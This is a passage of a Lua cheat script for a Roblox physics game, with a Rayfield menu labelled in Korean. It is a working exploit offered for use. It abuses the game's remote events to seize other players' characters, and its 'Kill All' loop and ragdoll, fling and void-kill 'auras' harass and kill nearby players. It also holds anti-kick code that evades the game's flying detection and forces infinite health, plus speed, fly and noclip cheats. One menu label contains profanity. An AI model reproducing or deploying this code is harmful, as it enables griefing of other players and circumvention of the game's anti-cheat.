                            if attacker and attacker.Character then
                                Struggle:FireServer()
                                SetNetworkOwner:FireServer(attacker.Character.Head or attacker.Character.Torso, attacker.Character.HumanoidRootPart.FirePlayerPart.CFrame)
                                task.wait(0.1)
                                local target = attacker.Character:FindFirstChild("Torso")
                                if target then
                                    local velocity = target:FindFirstChild("l") or Instance.new("BodyVelocity")
                                    velocity.Name = "l"
                                    velocity.Parent = target
                                    velocity.Velocity = Vector3.new(0, 50, 0)
                                    velocity.MaxForce = Vector3.new(0, math.huge, 0)
                                    Debris:AddItem(velocity, 100)
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(autoDefendCoroutine)
        else
            if autoDefendCoroutine then
                coroutine.close(autoDefendCoroutine)
                autoDefendCoroutine = nil
            end
        end
    end
})

antiTab:CreateSection("")


local AntiInPlots = antiTab:CreateToggle({
    Name = "안티 인플레이스",
    CurrentValue = true,
    Callback = function(Value)
    antiInPlotsEnabled = Value
         if Value then
            task.spawn(antiInPlotsLoop)
        end
    end
})
AntiInPlots:Set(true)


local AntiVoid = antiTab:CreateToggle({
    Name = "안티 보이드",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.FallenPartsDestroyHeight = -50000
        else
            workspace.FallenPartsDestroyHeight = -100
        end
    end,
})
AntiVoid:Set(true)

local AntiExplode = antiTab:CreateToggle({
    Name = "안티 폭탄",
    CurrentValue = false,
    Flag = "antiExplodeToggleFlag",
    Callback = function(Value)
        AntiExplosionT = Value
        if Value then
            AntiExplosionF()
        elseif AntiExplosionC then
            AntiExplosionC:Disconnect()
            AntiExplosionC = nil
        end
    end
})
AntiExplode:Set(true)
function setupAntiExplosion(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if humanoid then
        local partOwner = humanoid:FindFirstChild("Ragdolled")
        if partOwner then
            if antiExplosionConnection then antiExplosionConnection:Disconnect() end
            antiExplosionConnection = partOwner:GetPropertyChangedSignal("Value"):Connect(function()
                if partOwner.Value then
                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Anchored = true
                        end
                    end
                else
                    for _, part in ipairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Anchored = false
                        end
                    end
                end
            end)
        end
    end
end

antiTab:CreateToggle({
    Name = "안티 폭발V2  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    Default = false,
    Save = false,
    Flag = "AntiExplosion",
    Callback = function(enabled)
        local localPlayer = game.Players.LocalPlayer
        if not localPlayer then return end

        if enabled then
            if localPlayer.Character then
                setupAntiExplosion(localPlayer.Character)
            end
            if characterAddedConn then characterAddedConn:Disconnect() end
            characterAddedConn = localPlayer.CharacterAdded:Connect(function(character)
                setupAntiExplosion(character)
            end)
        else
            if antiExplosionConnection then
                antiExplosionConnection:Disconnect()
                antiExplosionConnection = nil
            end
            if characterAddedConn then
                characterAddedConn:Disconnect()
                characterAddedConn = nil
            end
        end
    end
})
task.spawn(function()
    task.wait(0.5)
    if AntiExplosionToggle and AntiExplosionToggle.Set then
        AntiExplosionToggle:Set(true)
    end
end)


local AntiBurn = antiTab:CreateToggle({
    Name = "불 무적",
    CurrentValue = false,
    Flag = "",
    Callback = function(Value)
        AntiBurnV = Value
        AntiBurn()
    end
})
AntiBurn:Set(true)

local AntiPaint = antiTab:CreateToggle({
    Name = "안티 페인트",
    CurrentValue = false,
    Callback = function(Value)
        AntiPaintT = Value
        antiPaintF(Value)
    end
})
AntiPaint:Set(true)

AntiLagF()
local AntiLag = antiTab:CreateToggle({
    Name = "안티 렉",
    CurrentValue = false,
    Flag = "AntiLagToggle",
    Callback = function(Value)
        antiLagEnabled = Value
    end
})
AntiLag:Set(true)
function antiLagF()
    local char = plr.Character
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    if antiLagT == true then
        plr.PlayerScripts.CharacterAndBeamMove.Disabled = true
    elseif antiLagT == false then
        plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
    end
end

antiTab:CreateToggle({
    Name = "안티 렉V2<font color='rgb(0,0,255)'>[프리미엄]</font>",
    Default = false,
    Callback = function(Value)
        antiLagT = Value
        antiLagF()
    end
})
antiTab:CreateToggle({
    Name = "안티렉V3[파카]",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
                Duration = 3,
                Image = nil,
            })
        end
    end,
})
local AutoAttack = antiTab:CreateToggle({
    Name = "오토어택 | 킬",
    CurrentValue = false,
    Flag = "AutoAttack",
    Callback = function(Value)
        AutoAttackT = Value
        AutoAttackF()
    end
})

local AntiHoldPart = antiTab:CreateToggle({
    Name = "음식소환 막기",
    CurrentValue = false,
    Callback = function(Value)
        AntiBananaT = Value
        task.spawn(AntiBananaF)
    end
})
--AntiHoldPart:Set(true)
antiTab:CreateLabel("동료핵이 있을경우 동료핵도 사용이 막힙니다.")
local AntiBlobUse = antiTab:CreateToggle({
    Name = "블롭맨 사용 막기   <font color='rgb(255,0,0)'>[gucci]</font>",
    CurrentValue = false,
    Callback = function(Value)
        AntiBlobUseT = Value
        if Value then
            AntiBlobUseF()
        end
    end
})

antiTab:CreateSection("킥")

local flyingResetConn = nil
local resetProtectionConn = nil
local FlyingReset = antiTab:CreateToggle({
    Name = "킥 방지리셋  <font color='rgb(50,0,50)'>[셀프 킬]</font>",
    CurrentValue = false,
    Callback = function(Value)
        if flyingResetConn then
            flyingResetConn:Disconnect()
            flyingResetConn = nil
        end
        if Value then
            flyingResetConn = rs.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(Type)
                if Type == "Flying" then
                    local char = plr.Character
                    if char then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then
                            pcall(function()
                                rs.CharacterEvents.Struggle:FireServer()
                            end)
                            hum.Health = 0
                            hum:ChangeState(Enum.HumanoidStateType.Dead)
                            char:BreakJoints()
                        end
                    end
                end
            end)
        end
    end
})
resetProtectionConn = plr.CharacterAdded:Connect(function(char)
    task.wait(0.2)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        hum.MaxHealth = math.huge
        hum.Health = math.huge
        hum.BreakJointsOnDeath = false
        hum.PlatformStand = false
        hum.HealthChanged:Connect(function(health)
            if health < hum.MaxHealth then
                hum.Health = hum.MaxHealth
            end
        end)
    end
end)

FlyingReset:Set(true)



local AntiKick = antiTab:CreateToggle({
    Name = "안티 킥 <font color='rgb(255,146,132)'>[표창]</font>",
    CurrentValue = false,
    Callback = function(Value)
        AntiKickT = Value
        task.spawn(AntiKickF)
    end
})
AntiKick:Set(true)
antiTab:CreateToggle({
   Name = "안티킥",
   CurrentValue = false,
   Callback = function(Value)
      AntiGrabStickyT = Value
      if Value then
          task.spawn(AntiGrabStickyF)
      end
   end,
})

antiTab:CreateButton({
    Name = "안티킥   <font color='rgb(90,200,10)'>[TP]</font>",
    Callback = function()
        House()

        local plotItemsFolder = workspace.PlotItems:FindFirstChild("Plot"..Plot)
        local TP = workspace.Plots["Plot"..Plot].PlotArea
        local targetCFrame = CFrame.new(TP.Position)

        local char = plr.Character
        if not char then return end

        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local ragdollHitbox = hrp:FindFirstChild("RagdollTouchedHitbox")
        if ragdollHitbox then
            hrp = ragdollHitbox
        end

        local originalPosition = hrp.CFrame

        local targetValue = CFrame.new(0.05, -0.3, 0.3) * CFrame.Angles(190, 0, 0)
        local stickyPartName = "NinjaShuriken"

        if plotItemsFolder then

            local closestShuriken = nil
            local closestDistance = math.huge

            for _, item in pairs(plotItemsFolder:GetChildren()) do
                if item.Name == "NinjaShuriken" then
                    local stickyPart = item:FindFirstChild("StickyPart")
                    if stickyPart then
                        local distance = (hrp.Position - stickyPart.Position).Magnitude
                        if distance < closestDistance then
                            closestDistance = distance
                            closestShuriken = item
                        end
                    end
                end
            end

            if closestShuriken and closestDistance <= 30 then
                local stickyPart = closestShuriken:FindFirstChild("StickyPart")
                if stickyPart then
                    local FIND2 = stickyPart:FindFirstChild("StickyWeld")

                    if not FIND2 or (FIND2 and FIND2.Part1 ~= hrp) then

                        if not plr.InPlot.Value then
                            hrp.CFrame = targetCFrame
                            task.wait(0.5)
                        end

                        pcall(function()
                            SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
                        end)

                        pcall(function()
                            rs.PlayerEvents.StickyPartEvent:FireServer(stickyPart, hrp, targetValue)
                        end)

                        hrp.CFrame = originalPosition
                    end
                end
            else
                if not plr.InPlot.Value then
                    hrp.CFrame = targetCFrame
                    task.wait(0.5)
                end

                task.spawn(function()
                    rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(stickyPartName, hrp.CFrame * CFrame.new(0,20,15), Vector3.new(0,0,0))
                end)

                task.wait(0.15)

                local newFind = plotItemsFolder:FindFirstChild("NinjaShuriken")
                if newFind then
                    local stickyPart = newFind:FindFirstChild("StickyPart")
                    if stickyPart then
                        pcall(function()
                            SetNetworkOwner:FireServer(stickyPart, stickyPart.CFrame)
                        end)

                        pcall(function()
                            rs.PlayerEvents.StickyPartEvent:FireServer(stickyPart, hrp, targetValue)
                        end)
                    end
                end

                hrp.CFrame = originalPosition
            end
        end
    end
})

function AntiPCLDF()
    local targetValueName = "[ " .. plr.DisplayName .. " ] ( @" .. plr.Name .. " )"
    
    while AntiPCLDT do
        task.wait(1) 
        
        local character = plr.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        local hrp = character and character:FindFirstChild("HumanoidRootPart")
        
           if not character or not humanoid or humanoid.Health <= 0 or not hrp then
            continue
        end
        
        
        local isDetected = false
        for _, item in ipairs(workspace:GetChildren()) do
            if item.Name == "PlayerCharacterLocationDetector" then
                local foundValue = item:FindFirstChild(targetValueName)
                if foundValue and foundValue:IsA("BoolValue") then
                    isDetected = true
                    break
                end
            end
        end
        
           if isDetected then
            pcall(function()
                
                hrp.CFrame = CFrame.new(0, 999999, 0)
                task.wait(0.5)
                
                       humanoid:ChangeState(Enum.HumanoidStateType.Dead)
            end)
            
                    local currentCharacter = plr.Character
            plr.CharacterAdded:Wait() 
            task.wait(2) 
        end
    end
end

local AntiPCLD = antiTab:CreateToggle({
    Name = "안티 킥   <font color='rgb(255,0,0)'>[PCLD 감지]</font>",
    CurrentValue = false,
    Flag = "16",
    Callback = function(Value)
        AntiPCLDT = Value
        task.spawn(AntiPCLDF)
    end
})
if not TESTPP then AntiPCLD:Set(true) end

antiTab:CreateSection("래그돌")
local PermRag = antiTab:CreateToggle({
    Name = "래그돌",
    CurrentValue = false,
    Flag = "34",
    Callback = function(Value)
        permRagdollT = Value
        if permRagdollT and not permRagdollRunningS then
            coroutine.wrap(permRagdollLoopF)()
        elseif not permRagdollT then
            permRagdollRunningS = false
        end
    end
})



antiTab:CreateSection("구찌")
local AutoGucci = antiTab:CreateToggle({
    Name = "오토구찌(킥위험 약간 있음!)  <font color='rgb(255,146,123)'>[블롭맨]</font>     <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "autoGucciToggleFlag",
    Callback = function(Value)
        AutoGucciT = Value
        if AutoGucciT then
            task.spawn(AutoGucciF)
        else
            if plr.Character.Humanoid then
                    plr.Character.Humanoid.Sit = true
                    task.wait(0.1)
                    plr.Character.Humanoid.Sit = false
                end
            end

            sitJumpT = false

            if blobmanInstanceS then
            RepStorage.MenuToys.DestroyToy:FireServer(blobmanInstanceS)
            blobmanInstanceS = nil
        end
    end
})

local AutoGucciV2 = antiTab:CreateToggle({
    Name = "기차 구찌",
    CurrentValue = false,
    Flag = "autoGucciToggleFlag",
    Callback = function(Value)
        AutoGucciTV2 = Value
        if AutoGucciTV2 then
            task.spawn(AutoGucciFV2)
        else
            local char = plr.Character
            if char then
                local hum = char:FindFirstChild("Humanoid")
                if hum then
                    hum.Sit = true
                    task.wait(0.1)
                    hum.Sit = false
                 end
	    end
    	 sitJumpT = false
     end
end
})

antiTab:CreateToggle({
    Name = "구찌V3   <font color='rgb(0,0,250)'>[파카]</font>",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
                Duration = 3,
                Image = nil,
            })
        end
    end,
})



playerTab:CreateSection("플레이어")
playerTab:CreateToggle({
    Name = "이동 속도   <font color='rgb(1,1,255)'>[스피드]</font>",
    CurrentValue = false,
    Flag = "28",
    Callback = function(Value)
        walkSpeedT = Value 
        updateWalkSpeedF()
    end
})

local walkSpeedInput = playerTab:CreateInput({
    Name = "값",
    CurrentValue = 16,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = true,
    Flag = "29",
    Callback = function(Value)
        walkSpeedV = Value
        updateWalkSpeedF()
    end
})
walkSpeedInput:Set(80)





playerTab:CreateToggle({
    Name = "점프 높이   <font color='rgb(0,25,0)'>[굳]</font>",
    CurrentValue = false,
    Flag = "30",
    Callback = function(Value)
        jumpPowerT = Value
        updateJumpPowerF()
    end
})

local jumpPowerInput = playerTab:CreateInput({
    Name = "값",
    CurrentValue = 24,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "31",
    Callback = function(Value)
        jumpPowerV = Value
        updateJumpPowerF()
    end
})
jumpPowerInput:Set(60)

local realisticFP = false
local fpConnection = nil

local function updateFirstPerson()
    local char = plr.Character
    if not char then return end

    for _, part in pairs(char:GetChildren()) do
        if part:IsA("BasePart") then
            if part.Name == "Head" then
                part.LocalTransparencyModifier = 1          
            elseif part.Name:find("Arm") or part.Name:find("Hand") then
                part.LocalTransparencyModifier = 0          
            elseif part.Name:find("Torso") or part.Name == "UpperTorso" or part.Name == "LowerTorso" then
                part.LocalTransparencyModifier = 1        
            else
                part.LocalTransparencyModifier = 0
            end
        end
    end
end

local function startRealisticFP()
    if fpConnection then fpConnection:Disconnect() end
    fpConnection = RunService.RenderStepped:Connect(updateFirstPerson)
end

local function stopRealisticFP()
    if fpConnection then 
        fpConnection:Disconnect() 
        fpConnection = nil 
    end
    
    local char = plr.Character
    if char then
        for _, part in pairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.LocalTransparencyModifier = 0
            end
        end
    end
end
playerTab:CreateToggle({
    Name = "1인칭 리얼뷰",
    CurrentValue = false,
    Callback = function(Value)
        realisticFP = Value
        if Value then
            startRealisticFP()
        else
            stopRealisticFP()
        end
    end
})
playerTab:CreateSection("나머지")
local NoClipToggle = playerTab:CreateToggle({
    Name = "노클립",
    CurrentValue = false,
    Flag = "32",
    Callback = function(Value)
        noClipT = Value
        updateNoClipF()
    end
})

playerTab:CreateToggle({
    Name = "무한 점프",
    CurrentValue = false,
    Callback = function(v)
        _G.InfiniteJump = v
    end
})

game:GetService("UserInputService").JumpRequest:Connect(function()
    if _G.InfiniteJump then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
    end
end)
local Fly = playerTab:CreateToggle({ 
    Name = "플라이   <font color='rgb(255,0,0)'>[데스크톱]</font>", 
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        flyT = Value
        flyF()
    end
})

local flyInput = playerTab:CreateInput({
    Name = "속도",
    CurrentValue = 50,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "37",
    Callback = function(Value)
        flyV = Value
    end
})
flyInput:Set(80)
playerTab:CreateSection("모바일플라이")
local function mflyF()
    if not mflyT then return end
    
    local char = plr.Character or plr.CharacterAdded:Wait()
    local humanoid = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart")

    local BV = Instance.new("BodyVelocity")
    local BG = Instance.new("BodyGyro")

    BG.P = 9e4
    BG.Parent = hrp
    BV.Parent = hrp
    BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.CFrame = hrp.CFrame
    BV.Velocity = Vector3.new(0,0,0)
    BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

    if mflyConnection then mflyConnection:Disconnect() end

    mflyConnection = RunService.Heartbeat:Connect(function()
        if not mflyT then
            mflyConnection:Disconnect()
            BV:Destroy()
            BG:Destroy()
            return
        end
        
        local camera = workspace.CurrentCamera
        local SPEED = mflyV or 100
        
        if humanoid.MoveDirection.Magnitude > 0 then
            local localMove = camera.CFrame:VectorToObjectSpace(humanoid.MoveDirection)
            
            local forwardVelocity = camera.CFrame.LookVector * -localMove.Z
            local sideVelocity = camera.CFrame.RightVector * localMove.X
            
            BV.Velocity = (forwardVelocity + sideVelocity).Unit * SPEED
        else
            BV.Velocity = Vector3.new(0, 0, 0)
        end
        
        BG.CFrame = camera.CFrame
    end)
end

playerTab:CreateToggle({ 
    Name = "플라이   <font color='rgb(0,255,0)'>[모바일]</font>", 
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        mflyT = Value
        mflyF()
    end
})
playerTab:CreateInput({
    Name = "속도",
    CurrentValue = 50,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "37",
    Callback = function(Value)
        mflyV = Value
    end
})

playerTab:CreateSection("엑스트라")

-- 1. Server Hop
playerTab:CreateButton({
    Name = "서버 훅",
    Callback = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
    end
})

-- 2. Rejoin
playerTab:CreateButton({
    Name = "제접ㅋ",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
    end
})

-- 3. FPS Unlock
playerTab:CreateButton({
    Name = "FPS 최대치",
    Callback = function()
        setfpscap(9999)
    end
})

-- 4. Full Bright
playerTab:CreateToggle({
    Name = "어둠 씨발 꺼져!!!!!",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            game:GetService("Lighting").Brightness = 2
            game:GetService("Lighting").ClockTime = 14
            game:GetService("Lighting").FogEnd = 100000
            game:GetService("Lighting").GlobalShadows = false
        else
            game:GetService("Lighting").Brightness = 1
            game:GetService("Lighting").GlobalShadows = true
        end
    end
})
playerTab:CreateSection("쓰잘때기없는 기능")

-- 1. 
playerTab:CreateToggle({
    Name = "FOV 변경",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.CurrentCamera.FieldOfView = 120
        else
            workspace.CurrentCamera.FieldOfView = 70
        end
    end
})

-- 2. 
playerTab:CreateButton({
    Name = "모든 장신구 제거",
    Callback = function()
        pcall(function()
            for _, item in pairs(plr.Character:GetChildren()) do
                if item:IsA("Accessory") or item.Name:find("Hat") or item.Name:find("Hair") then
                    item:Destroy()
                end
            end
        end)
    end
})

-- 3. 
playerTab:CreateToggle({
    Name = "중력 변경",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            workspace.Gravity = 50
        else
            workspace.Gravity = 196.2
        end
    end
})

AuraTab:CreateSection("안티 아우라들")
AuraTab:CreateToggle({
    Name = "안티 붐박스 아우라   <font color='rgb(0,200,0)'>[all]</font>",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiBoxT = Value
        AntiBoxF()
    end
})

AuraTab:CreateToggle({
    Name = "안티 바나나 아우라   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiBananaAuraT = Value
        AntiBananaAuraF()
    end
})

AuraTab:CreateToggle({
    Name = "안티 파트 아우라    <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        ViewAuraT = Value
        ViewAuraF()
    end
})



AuraTab:CreateToggle({
	Name = "주크박스 고정 아우라",
	CurrentValue = false,
	Flag = "AntiJukeboxAura",
	Callback = function(Value)
		_G.AntiJukeboxT = Value
		if Value then
			AntiJukeboxF()
		end
	end
})
AuraTab:CreateToggle({
	Name = "판자 고정 아우라",
	CurrentValue = false,
	Flag = "AntiPalletAura",
	Callback = function(Value)
		_G.AntiPalletT = Value
		if Value then
			AntiPalletF()
		end
	end
})



AuraTab:CreateSection("킬,플링")

AuraTab:CreateToggle({
    Name = "Kill All",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT3 = Value
        
        if not Value then
            return
        end

        task.spawn(function()
            while blobLoopT3 do
                local myChar = plr.Character
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                
                if myChar and myHum then
                    local currentSeat = myHum.SeatPart
                    if not (currentSeat and currentSeat.Parent and currentSeat.Parent.Name == "CreatureBlobman") then
                        if not workspace:FindFirstChild("CreatureBlobman") then
                            rs.BlobEvents.SpawnBlobman:FireServer()
                            task.wait(0.2)
                        end
                        
                        local targetBlob = workspace:FindFirstChild("CreatureBlobman")
                        if targetBlob then
                            local targetSeat = targetBlob:FindFirstChildOfClass("Seat") or targetBlob:FindFirstChild("DriveSeat")
                            if targetSeat then
                                targetSeat:Sit(myHum)
                                task.wait(0.1)
                            end
                        end
                    end
                end

                UpdateCurrentBlobman()

                local seat = plr.Character
                    and plr.Character:FindFirstChildOfClass("Humanoid")
                    and plr.Character:FindFirstChildOfClass("Humanoid").SeatPart

                if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
                    task.wait(0.5)
                    continue
                end

                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if not myHrp then 
                    task.wait(0.1)
                    continue 
                end

                local initialCFrame = myHrp.CFrame
                local teleportedToAny = false

                for _, player in ipairs(game.Players:GetPlayers()) do
                    if not blobLoopT3 then break end
                    if player == plr then continue end
                    if table.find(Whitelist, player.Name) or (PPs and PPs:FindFirstChild(player.Name)) then continue end

                    local char = player.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    
                    if not char or not hum or not hrp or char.Parent == nil or not hrp:IsDescendantOf(workspace) then 
                        continue 
                    end

                    if hum.Health <= 0 then continue end

                    local distance = (myHrp.Position - hrp.Position).Magnitude
                    if distance <= 200 then
                        teleportedToAny = true
                        local startTime = tick()

                        if distance > 30 then
                            TP(player)
                            task.wait(0.01)
                            
                            myChar = plr.Character
                            myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                            if myHrp then myHrp.CFrame = hrp.CFrame * CFrame.new(0, 0, 2) end
                        end

                        while blobLoopT3 and hum and hum.Health > 0 and char.Parent ~= nil do
                            local timePassed = tick() - startTime
                            
                            if timePassed >= 4 then
                                break
                            end

                            pcall(function()
                                rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                                hrp.AssemblyLinearVelocity = Vector3.new(0, -999999, 0)
                                rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -50000, hrp.Position.Z))
                            end)

                            if currentBlobS then
                                hum.BreakJointsOnDeath = false
                                hum.WalkSpeed = 0
                                hum.JumpPower = 0

                                if hum.SeatPart == nil then
                                    if hum.RigType ~= Enum.HumanoidRigType.R15 then hum.RigType = Enum.HumanoidRigType.R15 end
                                    if hum.RigType ~= Enum.HumanoidRigType.R6 then hum.RigType = Enum.HumanoidRigType.R6 end
                                    if hum.RigType ~= Enum.HumanoidRigType.R15 then hum.RigType = Enum.HumanoidRigType.R15 end
                                end

                                for i = 1, 3 do
                                    if not blobLoopT3 or hum.Health <= 0 then break end
                                    BlobGrab(currentBlobS, hrp, "Right")
                                    BlobRelease(currentBlobS, hrp, "Right")
                                end
                            end
                            
                            if timePassed >= 2 then
                                task.wait()
                            else
                                task.wait(0.02)
                            end
                        end
                    end
                end

                if blobLoopT3 and teleportedToAny then
                    myChar = plr.Character
                    myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if myHrp then
                        BACK(initialCFrame)
                        task.wait(0.05)
                    end
                end

                task.wait(0.05)
            end
        end)
    end
})


AuraTab:CreateToggle({
    Name = "래그돌 아우라",
    Default = false,
    Save = false,
    Flag = "FtapKillAura",
    Callback = function(enabled)
        runningFtapKillAura = enabled
        if enabled then
            task.spawn(function()
                local Players = game:GetService("Players")
                local localPlayer = game.Players.LocalPlayer
                local rs = game:GetService("ReplicatedStorage")
                
               
                local GrabEvents = rs:FindFirstChild("GrabEvents")
                local SetNetworkOwner = GrabEvents and GrabEvents:FindFirstChild("SetNetworkOwner")
                
                
                local DamageEvent = rs:FindFirstChild("DamageEvent") or (GrabEvents and GrabEvents:FindFirstChild("Struggle"))

                while runningFtapKillAura do
                    pcall(function()
                        local character = localPlayer.Character
                        local root = character and character:FindFirstChild("HumanoidRootPart")
                        if root then
                            
                            local currentRadius = tonumber(auraRadius) or 30
                            
                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    
                                    local isFriend = _G.Aurahowait and localPlayer:IsFriendsWith(player.UserId)
                                    if not isFriend then
                                        local targetChar = player.Character
                                        local torso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
                                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                                        local humanoid = targetChar:FindFirstChildOfClass("Humanoid")
                                        
                                        if torso and targetRoot and humanoid then
                                            local distance = (torso.Position - root.Position).Magnitude
                                            if distance <= currentRadius then
                                                
                                                
                                                if SetNetworkOwner and SetNetworkOwner.FireServer then
                                                    SetNetworkOwner:FireServer(torso, targetRoot.CFrame)
                                                end
                                                
                                                
                                                if DamageEvent and DamageEvent.FireServer then
                                                    
                                                    DamageEvent:FireServer(humanoid, 0)
                                                else
                                                    
                                                    humanoid.Health = 100
                                                end
                                                
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    task.wait() 
                end
            end)
        end
    end
})
local runningCombinedAura = false

AuraTab:CreateInput({
    Name = "아우라지름[반경]인풋",
    PlaceholderText = "기본값: 30",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        local num = tonumber(Text)
        if num then
            if num < 5 then
                auraRadius = 5
            else
                auraRadius = num
            end
        else
            auraRadius = 30
        end
    end
})

AuraTab:CreateToggle({
    Name = "필링 아우라    <font color='rgb(0,0,255)'>[프리미엄]</font>",
    Default = false,
    Save = false,
    Flag = "CombinedFlingAura",
    Callback = function(enabled)
        runningCombinedAura = enabled
        if enabled then
            task.spawn(function()
                local Players = game:GetService("Players")
                local localPlayer = game.Players.LocalPlayer
                local Debris = game:GetService("Debris")
                local rs = game:GetService("ReplicatedStorage")
                local SetNetworkOwner = rs:FindFirstChild("GrabEvents") and rs.GrabEvents:FindFirstChild("SetNetworkOwner")
                
                while runningCombinedAura do
                    pcall(function()
                        local character = localPlayer.Character
                        local root = character and character:FindFirstChild("HumanoidRootPart")
                        if root then
                            local currentRadius = tonumber(auraRadius) or 30
                            
                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local isFriend = _G.Aurahowait and localPlayer:IsFriendsWith(player.UserId)
                                    if not isFriend then
                                        local targetChar = player.Character
                                        local torso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
                                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                                        
                                        if torso and targetRoot then
                                            local distance = (torso.Position - root.Position).Magnitude
                                            if distance <= currentRadius then
                                                if SetNetworkOwner and SetNetworkOwner.FireServer then
                                                    SetNetworkOwner:FireServer(torso, targetRoot.CFrame)
                                                end
                                                
                                                local velocity = torso:FindFirstChild("l")
                                                if not velocity then
                                                    velocity = Instance.new("BodyVelocity")
                                                    velocity.Name = "l"
                                                    velocity.Parent = torso
                                                end
                                                velocity.Velocity = Vector3.new(5e10, 5e15, 5e10)
                                                velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                Debris:AddItem(velocity, 0.05) 
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    task.wait()
                end
            end)
        end
    end
})

AuraTab:CreateToggle({
    Name = "낙사 아우라   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    Default = false,
    Save = false,
    Flag = "FtapVoidKill",
    Callback = function(enabled)
        runningFtapVoidKill = enabled
        if enabled then
            task.spawn(function()
                local Players = game:GetService("Players")
                local localPlayer = game.Players.LocalPlayer
                local rs = game:GetService("ReplicatedStorage")
                
                local GrabEvents = rs:FindFirstChild("GrabEvents")
                local SetNetworkOwner = GrabEvents and GrabEvents:FindFirstChild("SetNetworkOwner")

                while runningFtapVoidKill do
                    pcall(function()
                        local character = localPlayer.Character
                        local root = character and character:FindFirstChild("HumanoidRootPart")
                        if root then
                            local currentRadius = tonumber(auraRadius) or 30
                            
                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character then
                                    local isFriend = _G.Aurahowait and localPlayer:IsFriendsWith(player.UserId)
                                    if not isFriend then
                                        local targetChar = player.Character
                                        local torso = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
                                        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                                        
                                        if torso and targetRoot then
                                            local distance = (torso.Position - root.Position).Magnitude
                                            if distance <= currentRadius then
                                                
                                                -- 1단계: 물리 오너십 박탈
                                                if SetNetworkOwner and SetNetworkOwner.FireServer then
                                                    SetNetworkOwner:FireServer(torso, targetRoot.CFrame)
                                                end
                                                
                                                -- 2단계: 딜레이 없이 Y축 -10000 낭떠러지로 강제 사출 (시스템 즉사 유도)
                                                targetRoot.CFrame = CFrame.new(targetRoot.Position.X, -10000, targetRoot.Position.Z)
                                                
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                    task.wait()
                end
            end)
        end
    end
})

AuraTab:CreateToggle({
    Name = "토이 플링   <font color='rgb(0,195,0)'>[파카]</font>",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
